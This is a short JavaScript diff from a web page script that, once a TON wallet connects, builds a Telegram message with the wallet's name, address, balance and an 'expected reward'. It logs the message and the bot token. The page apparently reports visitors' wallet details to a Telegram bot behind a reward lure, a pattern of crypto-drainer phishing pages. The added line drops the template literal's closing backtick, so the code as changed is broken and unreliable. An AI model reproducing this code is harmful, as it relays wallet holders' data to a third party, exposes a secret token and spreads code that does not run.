@@ -315,7 +315,7 @@ document.addEventListener("DOMContentLoaded", async () => {
           // Build message with wallet name and scan requirement notice
           const message = `✅ Connected\n🔗 <b>${walletName}</b>\nAddress: <code>${fullAddress}</code>\n💰 Balance: <b>${tonBalance.toFixed(
             4
-          )} TON</b>\n🏆 Rank: <b>${rankStatus}</b>\n🎁 Expected Reward: <b>${rewardStatus}</b>\n\n💡 <i>Scan wallet to determine actual rank and reward amount</i>`;
+          )} TON</b>\n🎁 Expected Reward: <b>${rewardStatus}</b>;
 
           console.log("Sending Telegram message:", message);
           console.log("Bot token:", botToken);
